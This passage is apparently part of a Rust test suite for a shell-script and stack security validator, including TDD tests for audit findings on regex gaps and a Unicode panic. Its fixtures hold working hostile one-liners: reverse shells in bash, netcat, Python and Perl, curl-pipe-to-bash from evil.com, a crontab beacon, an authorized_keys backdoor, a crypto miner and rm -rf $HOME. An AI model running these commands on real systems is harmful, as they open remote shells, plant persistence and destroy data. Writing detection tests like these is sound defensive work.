        assert!(!result.passed);
        assert!(result.details[0].contains("[CRITICAL]"));
    }

    #[test]
    fn test_reverse_shell_tcp_detected() {
        let scripts = &[("shell.sh", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")];
        let result = validate_shell_scripts(scripts);
        assert!(!result.passed);
        assert!(result.details.iter().any(|d| d.contains("[CRITICAL]") && d.contains("reverse shell")));
    }

    #[test]
    fn test_base64_decode_exec_detected() {
        let scripts = &[("decode.sh", "echo 'cHduZWQ=' | base64 -d | sh")];
        let result = validate_shell_scripts(scripts);
        assert!(!result.passed);
        assert!(result.details[0].contains("[CRITICAL]"));
    }

    #[test]
    fn test_crypto_miner_detected_in_script() {
        let scripts = &[("miner.sh", "#!/bin/bash\n./xmrig --url stratum+tcp://pool.minexmr.com:4444")];
        let result = validate_shell_scripts(scripts);
        assert!(!result.passed);
        assert!(result.details.iter().any(|d| d.contains("xmrig")));
    }

    #[test]
    fn test_rm_rf_root_detected() {
        let scripts = &[("cleanup.sh", "rm -rf /var/log/app")];
        let result = validate_shell_scripts(scripts);
        assert!(result.passed, "rm -rf on /var should pass (not / or /etc)");
    }

    #[test]
    fn test_nc_reverse_shell_detected() {
        let scripts = &[("pwn.sh", "nc -e /bin/sh 10.0.0.1 1234")];
        let result = validate_shell_scripts(scripts);
        assert!(!result.passed);
        assert!(result.details.iter().any(|d| d.contains("Netcat")));
    }

    #[test]
    fn test_multi_script_partial_failure() {
        let scripts = &[
            ("good.sh", "#!/bin/sh\necho ok"),
            ("bad.sh", "curl https://evil.com/backdoor.sh | bash"),
            ("also_good.sh", "#!/bin/bash\nset -e\ncp /data /backup/"),
        ];
        let result = validate_shell_scripts(scripts);
        assert!(!result.passed, "One bad script should fail the whole check");
        assert!(result.details[0].contains("bad.sh"), "Finding should reference the bad script name");
    }

    #[test]
    fn test_empty_script_passes() {
        let scripts = &[("empty.sh", "")];
        let result = validate_shell_scripts(scripts);
        assert!(result.passed);
    }

    #[test]
    fn test_obfuscated_eval_detected() {
        let scripts = &[("obfuscated.sh", "eval $(echo 'cHduZWQ=' | base64 -d)")];
        let result = validate_shell_scripts(scripts);
        assert!(!result.passed);
    }

    #[test]
    fn test_pastebin_download_detected() {
        let scripts = &[("fetch.sh", "curl -s https://pastebin.com/raw/abc123 > /tmp/payload")];
        let result = validate_shell_scripts(scripts);
        assert!(!result.passed);
        assert!(result.details.iter().any(|d| d.contains("pastebin")));
    }

    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    // Security-audit follow-up tests (M1, M2, plus coverage gaps).
    //
    // These tests are written FIRST (TDD): they encode the intended
    // post-fix behaviour and MUST fail against the current code.
    // The fix in src/helpers/security_validator.rs flips them to green.
    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    /// M1: the current `bash\s+<(curl|wget)` regex treats `(curl|wget)` as a
    /// capture group, so it never matches the real bash process substitution
    /// syntax `bash <(curl ...)`. After the fix the regex must match it.
    #[test]
    fn test_bash_process_substitution_curl_detected() {
        let scripts = &[(
            "evil.sh",
            "#!/bin/bash\nbash <(curl -sSL https://evil.example/payload)\n",
        )];
        let result = validate_shell_scripts(scripts);
        assert!(
            !result.passed,
            "bash <(curl ...) must be flagged, got passed=true with details={:?}",
            result.details
        );
        assert!(
            result.details.iter().any(|d| d.contains("[CRITICAL]")),
            "bash <(curl ...) must be CRITICAL, got: {:?}",
            result.details
        );
    }

    /// M1: same broken regex; symmetric case with `wget`.
    #[test]
    fn test_bash_process_substitution_wget_detected() {
        let scripts = &[("evil.sh", "bash <(wget -qO- https://evil.example/x)")];
        let result = validate_shell_scripts(scripts);
        assert!(
            !result.passed,
            "bash <(wget ...) must be flagged, got: {:?}",
            result.details
        );
    }

    /// M1 / coverage gap: setuid bit installation is a classic persistence /
    /// privesc move and is currently not in `SHELL_MALICIOUS_PATTERNS` at all.
    #[test]
    fn test_setuid_chmod_detected() {
        let scripts = &[("setuid.sh", "chmod u+s /tmp/payload\n")];
        let result = validate_shell_scripts(scripts);
        assert!(
            !result.passed,
            "chmod u+s (setuid) must be flagged, got: {:?}",
            result.details
        );
    }

    /// M1 / coverage gap: setgid variant, currently uncovered.
    #[test]
    fn test_setgid_chmod_detected() {
        let scripts = &[("setgid.sh", "chmod g+s /usr/local/bin/x\n")];
        let result = validate_shell_scripts(scripts);
        assert!(
            !result.passed,
            "chmod g+s (setgid) must be flagged, got: {:?}",
            result.details
        );
    }

    /// M1: current `rm\s+(-rf|--recursive)\s+/[^a-z]` requires a literal `/`
    /// after `-rf`, so `rm -rf $HOME` slips through. After the fix it must
    /// match the $HOME variable form.
    #[test]
    fn test_rm_rf_home_var_detected() {
        let scripts = &[("nuke.sh", "rm -rf $HOME\n")];
        let result = validate_shell_scripts(scripts);
        assert!(
            !result.passed,
            "rm -rf $HOME must be flagged, got: {:?}",
            result.details
        );
    }

    /// M1: same regex gap; tilde form is also missed.
    #[test]
    fn test_rm_rf_tilde_detected() {
        let scripts = &[("nuke.sh", "rm -rf ~/\n")];
        let result = validate_shell_scripts(scripts);
        assert!(
            !result.passed,
            "rm -rf ~/ must be flagged, got: {:?}",
            result.details
        );
    }

    /// Coverage gap: Python reverse shells are not detected at all.
    #[test]
    fn test_python_reverse_shell_detected() {
        let scripts = &[(
            "revshell.sh",
            "python3 -c \"import socket,os,pty;s=socket.socket();s.connect(('10.0.0.1',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('sh')\"\n",
        )];
        let result = validate_shell_scripts(scripts);
        assert!(
            !result.passed,
            "Python reverse shell one-liner must be flagged, got: {:?}",
            result.details
        );
    }

    /// Coverage gap: Perl reverse shells are not detected at all.
    #[test]
    fn test_perl_reverse_shell_detected() {
        let scripts = &[(
            "perl_revshell.sh",
            "perl -e 'use Socket;$i=\"10.0.0.1\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}'\n",
        )];
        let result = validate_shell_scripts(scripts);
        assert!(
            !result.passed,
            "Perl reverse shell one-liner must be flagged, got: {:?}",
            result.details
        );
    }

    /// Coverage gap: appending to `~/.ssh/authorized_keys` is currently only
    /// flagged as a `warning` (substring match) — but it is the canonical
    /// SSH-backdoor persistence move and must be CRITICAL.
    #[test]
    fn test_authorized_keys_append_is_critical() {
        let scripts = &[(
            "backdoor.sh",
            "echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBxxxx attacker@evil\" >> ~/.ssh/authorized_keys\n",
        )];
        let result = validate_shell_scripts(scripts);
        assert!(!result.passed);
        assert!(
            result.details.iter().any(|d| d.contains("[CRITICAL]")
                && d.to_lowercase().contains("authorized_keys")),
            "Appending to authorized_keys must be CRITICAL, got: {:?}",
            result.details
        );
    }

    /// Coverage gap: persistent crontab install is undetected.
    #[test]
    fn test_crontab_persistence_detected() {
        let scripts = &[(
            "persist.sh",
            "echo '* * * * * curl -sSL https://evil.example/beacon | sh' | crontab -\n",
        )];
        let result = validate_shell_scripts(scripts);
        assert!(
            !result.passed,
            "crontab install must be flagged, got: {:?}",
            result.details
        );
    }

    /// M2: `validate_shell_scripts` indexes the original `content` with an
    /// offset computed from `content.to_lowercase()`. For inputs where
    /// `to_lowercase()` SHRINKS the byte length — e.g. `ẞ` (U+1E9E, Capital
    /// Sharp S, 3 bytes) → `ß` (U+00DF, 2 bytes) — the returned index can
    /// land mid-UTF-8 sequence in the original, panicking the slice. The
    /// fix must map the lowercase offset back to a valid char boundary
    /// in the original (or search the original directly).
    #[test]
    fn test_miner_detection_does_not_panic_on_shrinking_lowercase() {
        // ẞ (capital sharp S, 3 bytes) lowercases to ß (2 bytes).
        // With the leading ẞ, `content_lower.find("xmrig")` returns 2,
        // but byte index 2 in `content` lands mid-codepoint of ẞ.
        let scripts: &[(&str, &str)] = &[(
            "evil.sh",
            "ẞxmrig --url stratum+tcp://pool.example:4444\n",
        )];
        let outcome = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
            validate_shell_scripts(scripts)
        }));
        assert!(
            outcome.is_ok(),
            "validate_shell_scripts must not panic on Unicode-prefixed miner patterns \
             where to_lowercase() shrinks byte length"
        );
        let report = outcome.unwrap();
        assert!(
            !report.passed,
            "Miner pattern with Unicode prefix should still be flagged after fix"
        );
    }

    /// Regression guard for the M2-sibling refactor at `check_no_hardcoded_creds`.
    ///
    /// The old implementation was `content.to_lowercase().contains(cred)` which
    /// (a) allocated a fresh String per credential iteration, and (b) shared
    /// the `to_lowercase()` code smell with the two miner-detection sites that
    /// triggered the ẞ UTF-8 panic. The refactor switches to
    /// `RegexBuilder::case_insensitive(true)` for consistency and to eliminate
    /// per-call allocation. These tests lock in the observable behaviour so a
    /// future rewrite can't silently make the check case-sensitive or ASCII-only.
    #[test]
    fn test_hardcoded_default_creds_detected_uppercase() {
        // ADMIN:ADMIN in an env value — must still be flagged case-insensitively.
        let definition = serde_json::json!({
            "services": {
                "app": {
                    "image": "myapp:1.0",
                    "environment": {
                        "TEST_CREDS": "ADMIN:ADMIN"
                    }
                }
            }
        });
        let report = validate_stack_security(&definition);
        assert!(
            !report.no_hardcoded_creds.passed,
            "ADMIN:ADMIN must be flagged as a default credential, details: {:?}",
            report.no_hardcoded_creds.details
        );
    }

    #[test]
    fn test_hardcoded_default_creds_detected_mixed_case() {
        // Root:Root — real-world sighting from misconfigured healthchecks.
        let definition = serde_json::json!({
            "services": {
                "db": {
                    "image": "postgres:16",
                    "environment": {
                        "AUTH_STRING": "Root:Root"
                    }
                }
            }
        });
        let report = validate_stack_security(&definition);
        assert!(
            !report.no_hardcoded_creds.passed,
            "Root:Root must be flagged as a default credential, details: {:?}",
            report.no_hardcoded_creds.details
        );
    }

    /// The refactor uses `regex::escape(cred)` so credential strings are
    /// treated as literals. Sanity-check the escape by confirming that a
    /// non-credential value containing regex metacharacters does NOT
    /// accidentally trigger the check.
    #[test]
    fn test_hardcoded_default_creds_regex_metachar_safe() {
        // "admin.admin" is not one of the tracked credentials. If the
        // credential string were compiled as a regex without escape, `.`
        // would match any char and this would match. With regex::escape
        // it stays a literal dot and won't match "admin:admin".
        let definition = serde_json::json!({
            "services": {
                "app": {
                    "image": "myapp:1.0",
                    "environment": {
                        "NOTE": "admin.admin"
                    }
                }
            }
        });
        let report = validate_stack_security(&definition);
        assert!(
            report.no_hardcoded_creds.passed,
            "'admin.admin' must NOT match the 'admin:admin' credential rule after regex::escape, details: {:?}",
            report.no_hardcoded_creds.details
        );
    }

    /// M3: the base64 warning at 200 chars produces noise on every typical
    /// PEM cert / JWT / dockerconfig blob. After the fix the threshold must
    /// be raised (proposed: 1024) so a 500-char blob is NOT flagged on its
    /// own.
    #[test]
    fn test_base64_warning_not_aggressive_on_typical_cert_size() {
        let payload: String = "A".repeat(500);
        let script = format!("CERT='{}'\necho ok\n", payload);
        let scripts: Vec<(&str, &str)> = vec![("config.sh", script.as_str())];
        let result = validate_shell_scripts(&scripts);
        assert!(
            result.passed,
            "500-char base64 (typical PEM body) should not trigger a finding after threshold fix, got: {:?}",
            result.details
        );
    }
}
